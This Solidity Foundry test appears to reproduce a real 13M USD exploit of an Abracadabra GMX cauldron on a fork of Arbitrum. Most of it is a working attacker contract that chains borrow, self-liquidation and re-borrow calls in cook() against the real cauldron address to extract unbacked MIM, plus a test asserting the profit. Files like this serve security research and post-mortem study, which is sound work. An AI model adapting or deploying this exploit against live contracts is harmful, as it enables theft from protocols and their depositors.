// SPDX-License-Identifier: UNLICENSED
// @KeyInfo - Total Lost : 13M USD
// Attacker : https://arbiscan.io/address/0x51c9d0264d829a4F6d525dF2357Cd20Ea79b5049
// Vulnerable Contract : https://arbiscan.io/address/0x625Fe79547828b1B54467E5Ed822a9A8a074bD61
// Attack Tx : https://arbiscan.io/tx/0xed17089aa6c57b7d5461209e853bdb56bc3460a91805e20d2590609a515ef0b0

// @Analysis
// The GMX cauldron counted a failed-but-unclosed order as collateral. During cook(), the attacker borrowed,
// self-liquidated to erase that debt, then borrowed again because the stale order was still counted.
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

interface IAbracadabraCauldron {
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);
    function accrue() external;
    function updateExchangeRate() external returns (bool updated, uint256 rate);
}

interface IDegenBox {
    function balanceOf(address token, address user) external view returns (uint256);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256);
    function deposit(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);
    function withdraw(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

contract AbracadabraMarchAttacker {
    IAbracadabraCauldron private constant CAULDRON =
        IAbracadabraCauldron(0x625Fe79547828b1B54467E5Ed822a9A8a074bD61);
    IDegenBox private constant DEGEN_BOX = IDegenBox(0x7C8FeF8eA9b1fE46A7689bfb8149341C90431D38);
    IERC20 private constant MIM = IERC20(0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A);

    uint8 private constant ACTION_BORROW = 5;
    uint8 private constant ACTION_CALL = 30;
    uint8 private constant ACTION_LIQUIDATE = 31;
    int256 private constant USE_VALUE1 = -1;

    address private immutable borrower;

    constructor(address _borrower) {
        borrower = _borrower;
        MIM.approve(address(DEGEN_BOX), type(uint256).max);
    }

    function buildCook()
        external
        view
        returns (uint8[] memory actions, uint256[] memory values, bytes[] memory datas)
    {
        actions = new uint8[](7);
        actions[0] = ACTION_BORROW;
        actions[1] = ACTION_CALL;
        actions[2] = ACTION_BORROW;
        actions[3] = ACTION_LIQUIDATE;
        actions[4] = ACTION_CALL;
        actions[5] = ACTION_BORROW;
        actions[6] = ACTION_CALL;

        values = new uint256[](7);
        datas = new bytes[](7);

        datas[0] = abi.encode(int256(30_000 ether), address(this));
        datas[1] = _externalCall(abi.encodeCall(this.crossLiquidationBoundary, ()));
        datas[2] = abi.encode(USE_VALUE1, address(this));

        address[] memory users = new address[](1);
        users[0] = borrower;
        uint256[] memory maxBorrowParts = new uint256[](1);
        maxBorrowParts[0] = 138_100 ether;
        datas[3] = abi.encode(users, maxBorrowParts, address(this), address(this), bytes(""));

        datas[4] = _externalCall(abi.encodeCall(this.amountToBorrow, ()));
        datas[5] = abi.encode(USE_VALUE1, address(this));
        datas[6] = _externalCall(abi.encodeCall(this.withdrawProfit, ()));

    }

    function crossLiquidationBoundary() external returns (uint256) {
        require(msg.sender == address(CAULDRON), "only cauldron");
        CAULDRON.accrue();
        CAULDRON.updateExchangeRate();
        return 1;
    }

    function amountToBorrow() external view returns (uint256) {
        require(msg.sender == address(CAULDRON), "only cauldron");
        return 110_500 ether;
    }

    function withdrawProfit() external returns (uint256) {
        require(msg.sender == address(CAULDRON), "only cauldron");
        uint256 share = DEGEN_BOX.balanceOf(address(MIM), address(this));
        DEGEN_BOX.withdraw(address(MIM), address(this), address(this), 0, share);
        return 0;
    }

    function swap(
        address,
        address,
        address recipient,
        uint256 shareToMin,
        uint256,
        bytes calldata
    ) external returns (uint256 extraShare, uint256 shareReturned) {
        require(msg.sender == address(CAULDRON), "only cauldron");

        uint256 borrowedShare = DEGEN_BOX.balanceOf(address(MIM), address(this));
        if (borrowedShare > 0) {
            DEGEN_BOX.withdraw(address(MIM), address(this), address(this), 0, borrowedShare);
        }

        uint256 amount = DEGEN_BOX.toAmount(address(MIM), shareToMin, true);
        (, shareReturned) = DEGEN_BOX.deposit(address(MIM), address(this), recipient, amount, 0);
        extraShare = shareReturned - shareToMin;
    }

    function _externalCall(
        bytes memory callData
    ) private view returns (bytes memory) {
        return abi.encode(address(this), callData, false, false, uint8(1));
    }
}

contract AbracadabraMarchExploit is BaseTestWithBalanceLog {
    address private constant ATTACKER_EOA = 0x51c9d0264d829a4F6d525dF2357Cd20Ea79b5049;
    address private constant MIM = 0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A;

    AbracadabraMarchAttacker private attacker;

    function setUp() public {
        vm.createSelectFork("https://arbitrum-one.public.blastapi.io", 319_330_233);
        fundingToken = MIM;

        attacker = new AbracadabraMarchAttacker(ATTACKER_EOA);
        // The original attack sourced this temporary liquidation liquidity through swaps.
        deal(MIM, address(attacker), 112_000 ether);
    }

    function testExploit() public balanceLog {
        (uint8[] memory actions, uint256[] memory values, bytes[] memory datas) = attacker.buildCook();

        // The stale GMX order belongs to this borrower. The fresh contract builds the recipe and handles callbacks.
        vm.prank(ATTACKER_EOA);
        IAbracadabraCauldron(0x625Fe79547828b1B54467E5Ed822a9A8a074bD61).cook(actions, values, datas);

        uint256 balanceAfter = IERC20(MIM).balanceOf(address(attacker));
        assertGt(balanceAfter, 100_000 ether, "stale order should permit a second unbacked borrow");
        emit log_named_decimal_uint("MIM extracted after self-liquidation", balanceAfter, 18);
    }
}
